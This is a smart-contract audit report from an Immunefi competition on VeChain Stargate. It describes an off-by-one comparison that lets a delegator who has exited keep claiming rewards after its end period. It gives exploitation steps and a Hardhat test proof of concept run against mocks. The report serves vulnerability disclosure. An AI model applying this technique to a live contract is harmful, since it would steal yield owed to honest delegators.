# 59733 sc high post exit delegations can drain future rewards

**Submitted on Nov 15th 2025 at 10:31:34 UTC by @OxPrince for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #59733
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

### Brief/Intro

`_claimableDelegationPeriods` only clamps to `endPeriod` when `endPeriod > nextClaimablePeriod`; once a delegator has already claimed up to `endPeriod - 1`, the equality case drops into the “active” branch and exposes `(nextClaimablePeriod, completedPeriods)` as the claim window (packages/contracts/contracts/Stargate.sol (lines 905-930)).\
`_claimRewards` iterates across that expanded window and pays the token for each period using its full effective stake (packages/contracts/contracts/Stargate.sol (lines 739-849)), while `_updatePeriodEffectiveStake` has already removed that stake from validator totals. The mismatch lets an exited delegator drain all later rewards (packages/contracts/contracts/Stargate.sol (lines 560-569) and packages/contracts/contracts/Stargate.sol (lines 993-1013)).

## Vulnerability Details

`_claimableDelegationPeriods` only truncates the claimable window to `endPeriod` while `endPeriod > nextClaimablePeriod` (strictly greater) even though the last claim a delegator is supposed to make happens when `nextClaimablePeriod == endPeriod`.

* When a user has already claimed every period up to `endPeriod - 1` before (or right after) signalling exit, that equality holds and the function falls through to the “active delegation” branch, which returns `(nextClaimablePeriod, completedPeriods)` instead of `(nextClaimablePeriod, endPeriod)` (packages/contracts/contracts/Stargate.sol:905-930).
* `_claimRewards` then loops through every period in that oversized range and pays the token for each of them (packages/contracts/contracts/Stargate.sol:739-849), even though the delegation has already ended.

## Impact Details

After `requestDelegationExit` is called, `_updatePeriodEffectiveStake` schedules the token’s stake to be removed from `delegatorsEffectiveStake` starting in the next period (packages/contracts/contracts/Stargate.sol:560-569, packages/contracts/contracts/Stargate.sol:993-1013). This means the numerator in `_claimableRewardsForPeriod` still uses the full token stake, but the denominator no longer includes it, so the exited token can collect an outsized share of every later period’s delegators rewards.

* By simply delaying their final `claimRewards` call until the validator has produced many more periods, an exited delegator can receive virtually all of the VTHO meant for the remaining delegators for those periods (and even more than was minted for them, because the denominator is too small). Honest delegators are diluted and the protocol pays out more than it should—clear theft of unclaimed yield.

{% stepper %}
{% step %}

### Step

A delegator routinely claims rewards, so their `lastClaimedPeriod` always equals the most recently completed period.
{% endstep %}

{% step %}

### Step

During validator period `E`, the delegator calls `requestDelegationExit`. The protocol sets `endPeriod = E` (packages/contracts/contracts/mocks/ProtocolStakerMock.sol:145-177) and `_updatePeriodEffectiveStake` schedules the stake drop from period `E + 1` onwards.
{% endstep %}

{% step %}

### Step

The user does **not** claim immediately after the exit finalizes. Instead, they wait for the validator to complete `k` additional periods (so `completedPeriods = E + k`).
{% endstep %}

{% step %}

### Step

When they finally call `claimRewards`, we have `nextClaimablePeriod = lastClaimedPeriod + 1 = E` and `endPeriod = E`, so the strict `>` check fails. The function returns `(E, completedPeriods)` and `_claimableRewards` iterates through every period from `E` to `E + k`, paying the exited delegator with their full effective stake even though they contributed nothing in periods `E + 1 … E + k`.
{% endstep %}
{% endstepper %}

## Not a Design Choice

`signalDelegationExit` explicitly records `endPeriod` as the validator’s current period (packages/contracts/contracts/mocks/ProtocolStakerMock.sol:169-177), and `_claimableDelegationPeriods` describes the first branch as handling “delegations that ended.” The intent is clearly to stop payouts after `endPeriod`.

`_updatePeriodEffectiveStake` removes the token’s stake from future checkpoint totals (packages/contracts/contracts/Stargate.sol:993-1013), so the economic model assumes the delegator no longer earns rewards afterward. Letting `_claimableRewards` keep using the token’s full effective stake contradicts that intent and is only happening because of the strict comparison bug.

## References

Add any relevant links to documentation or code

## Proof of Concept

Paste this into Rewards.tests.ts

```rust
  it("should allow an exited delegation to keep claiming past the recorded end period", async () => {
        const levelSpec = await stargateNFTMock.getLevel(LEVEL_ID);
        tx = await stargateContract.connect(user).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const tokenId = await stargateNFTMock.getCurrentTokenId();

        tx = await stargateContract.connect(otherUser).stake(LEVEL_ID, {
            value: levelSpec.vetAmountRequiredToStake,
        });
        await tx.wait();
        const otherTokenId = await stargateNFTMock.getCurrentTokenId();

        await stargateContract.connect(user).delegate(tokenId, validator.address);
        await stargateContract.connect(otherUser).delegate(otherTokenId, validator.address);

        // Accumulate a few periods and claim them so lastClaimedPeriod aligns with the exit period - 1.
        let currentPeriod = 6;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(
            validator.address,
            currentPeriod - 1
        );
        await tx.wait();
        tx = await stargateContract.connect(user).claimRewards(tokenId);
        await tx.wait();

        // Request exit while the validator is still on the same period.
        await stargateContract.connect(user).requestDelegationExit(tokenId);
        const delegationId = await stargateContract.getDelegationIdOfToken(tokenId);
        const [, endPeriod] = await protocolStakerMock.getDelegationPeriodDetails(delegationId);
        expect(endPeriod).to.equal(BigInt(currentPeriod));

        // Advance the validator a few extra periods after the delegation has ended.
        const completedAfterExit = 10;
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(
            validator.address,
            completedAfterExit
        );
        await tx.wait();

        const [firstClaimablePeriod, lastClaimablePeriod] =
            await stargateContract.claimableDelegationPeriods(tokenId);
        expect(firstClaimablePeriod).to.equal(endPeriod);
        expect(lastClaimablePeriod).to.equal(BigInt(completedAfterExit));
        expect(lastClaimablePeriod).to.be.greaterThan(endPeriod);

        const claimableRewards = await stargateContract["claimableRewards(uint256)"](tokenId);
        const claimablePeriods = lastClaimablePeriod - firstClaimablePeriod + 1n;
        expect(claimablePeriods).to.be.greaterThan(1n);
        const postExitPeriods = lastClaimablePeriod - endPeriod;
        expect(postExitPeriods).to.be.greaterThan(0n);
        const expectedRewards = (REWARDS_PER_PERIOD / 2n) + postExitPeriods * REWARDS_PER_PERIOD;
        expect(claimableRewards).to.equal(expectedRewards);
        expect(claimableRewards).to.be.greaterThan(REWARDS_PER_PERIOD);

        const claimTx = await stargateContract.connect(user).claimRewards(tokenId);
        await expect(claimTx)
            .to.emit(stargateContract, "DelegationRewardsClaimed")
            .withArgs(
                user.address,
                tokenId,
                delegationId,
                claimableRewards,
                firstClaimablePeriod,
                lastClaimablePeriod
            );
    });
```
